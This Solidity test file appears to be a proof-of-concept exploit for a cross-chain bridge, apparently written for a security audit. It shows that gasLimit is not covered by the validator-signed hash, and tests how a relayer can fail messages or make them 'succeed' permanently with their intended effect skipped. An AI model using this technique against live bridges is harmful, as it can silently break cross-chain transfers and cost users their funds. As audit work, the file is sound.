// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

// Drop into: bridge/base/test/
// Lead: IncomingMessage.gasLimit is NOT part of the validator-signed hash (sender, ty, data, nonce, outgoingMessagePubkey),
// and Bridge._validateAndRelay never checks gasleft() against it. Any relayer can therefore pick the gas budget for a
// validated message. UNTESTED: gas numbers may need tuning (run with -vvv and adjust ATTACK_GAS).

import {DeployScript} from "../script/Deploy.s.sol";
import {Call, CallType} from "../src/libraries/CallLib.sol";
import {IncomingMessage, MessageType} from "../src/libraries/MessageLib.sol";
import {Pubkey} from "../src/libraries/SVMLib.sol";
import {CommonTest} from "./CommonTest.t.sol";

/// Stand-in for any Twin target that tolerates sub-call failure (Multicall3 allowFailure, try/catch hooks, ...).
contract BestEffortTarget {
    uint256 public done; // 0 = not run, 2 = ran but best-effort step failed, 3 = ran and step succeeded
    uint256 public payload; // set only if the heavy step completes
    uint256[100] public junk;

    function run() external {
        done = 1; // pre-warm the slot so the post-step is cheap
        (bool ok,) = address(this).call(abi.encodeCall(this.heavy, ()));
        done = ok ? 3 : 2;
    }

    function heavy() external {
        for (uint256 i; i < 100; i++) {
            junk[i] = i + 1;
        }
        payload = 1;
    }
}

contract UnsignedGasLimitTest is CommonTest {
    Pubkey constant SENDER = Pubkey.wrap(0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef);
    uint64 constant INTENDED_GAS = 5_000_000;
    uint64 constant ATTACK_GAS = 1_200_000; // heavy step needs ~2.3M, post-step needs only a few k

    BestEffortTarget target;

    function setUp() public {
        DeployScript deployer = new DeployScript();
        (twinBeacon, bridgeValidator, bridge, factory, relayerOrchestrator, helperConfig,) = deployer.run();
        cfg = helperConfig.getConfig();
        target = new BestEffortTarget();
    }

    function _msg(uint64 gasLimit) internal view returns (IncomingMessage memory m) {
        m = IncomingMessage({
            outgoingMessagePubkey: TEST_OUTGOING_MESSAGE,
            nonce: 0,
            sender: SENDER,
            gasLimit: gasLimit,
            ty: MessageType.Call,
            data: abi.encode(
                Call({ty: CallType.Call, to: address(target), value: 0, data: abi.encodeCall(BestEffortTarget.run, ())})
            )
        });
    }

    function _relay(IncomingMessage memory m) internal {
        IncomingMessage[] memory ms = new IncomingMessage[](1);
        ms[0] = m;
        bridge.relayMessages(ms);
    }

    /// Control: the intended gas budget gives the intended outcome.
    function test_control_intendedGas() public {
        IncomingMessage memory m = _msg(INTENDED_GAS);
        _registerMessage(m);
        _relay(m);
        assertTrue(bridge.successes(bridge.getMessageHash(m)));
        assertEq(target.done(), 3);
        assertEq(target.payload(), 1);
    }

    /// Anyone can fail a validated message with a tiny gasLimit; it stays retryable (failures=true, successes=false).
    function test_tinyGasLimit_failsButIsRetryable() public {
        IncomingMessage memory m = _msg(INTENDED_GAS);
        _registerMessage(m);
        bytes32 h = bridge.getMessageHash(m);

        _relay(_msg(30_000)); // same signed hash, different unsigned gasLimit
        assertTrue(bridge.failures(h));
        assertFalse(bridge.successes(h));

        _relay(m); // retry with the real gas
        assertTrue(bridge.successes(h));
        assertEq(target.payload(), 1);
    }

    /// Core PoC: a mid-sized gasLimit makes the message "succeed" permanently with the best-effort step skipped.
    function test_midGasLimit_permanentPartialExecution() public {
        IncomingMessage memory m = _msg(INTENDED_GAS);
        _registerMessage(m);
        bytes32 h = bridge.getMessageHash(m);

        _relay(_msg(ATTACK_GAS));
        assertTrue(bridge.successes(h), "marked success");
        assertEq(target.done(), 2, "run() finished, heavy step failed silently");
        assertEq(target.payload(), 0, "intended effect never happened");

        _relay(m); // legitimate retry is now a no-op
        assertEq(target.payload(), 0, "cannot be re-executed");
    }
}
